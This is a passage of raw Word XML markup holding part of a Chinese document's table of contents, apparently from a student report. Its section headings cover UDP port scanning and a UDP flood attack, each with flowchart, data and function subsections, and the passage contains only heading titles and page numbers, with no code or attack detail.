            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522637"</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4.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP端口扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522637 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="167" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="429C3D34" w14:textId="5CDCAD06" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="168" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="169" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522638"</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4.2.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>流程图</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522638 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="170" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7EE4CF13" w14:textId="3B96741E" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="171" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="172" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522639"</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4.2.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要数据</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522639 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="173" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2AE90E47" w14:textId="0F058645" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="174" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="175" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522640"</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4.2.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要函数</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522640 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="176" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>20</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="49D595BB" w14:textId="32394F5D" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="177" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="178" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522641"</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4.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522641 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="179" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="21DDFBE8" w14:textId="6A149933" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="180" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="181" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522642"</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4.3.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>流程图</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522642 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="182" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5C15A602" w14:textId="74D63F70" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="183" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="184" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522643"</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4.3.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要数据</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522643 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="185" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="458E7371" w14:textId="439B6B50" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="186" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="187" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522644"</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4.3.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要函数</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522644 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="188" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="04EF924B" w14:textId="33E66707" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="189" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="190" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522645"</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4.4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>本章小结</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522645 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="191" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75CBEB5C" w14:textId="4EF1E46C" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="192" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="193" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
